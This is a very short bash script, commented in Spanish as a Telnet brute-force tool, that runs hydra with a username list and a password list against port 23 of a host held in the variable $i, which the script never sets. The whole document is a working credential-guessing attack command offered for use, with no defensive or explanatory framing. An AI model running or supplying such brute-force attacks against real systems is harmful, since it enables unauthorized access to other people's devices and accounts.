#!/bin/bash
# Fuerza bruta Telnet

echo $i
hydra -L usuarios.txt -P claves.txt telnet://$i:23
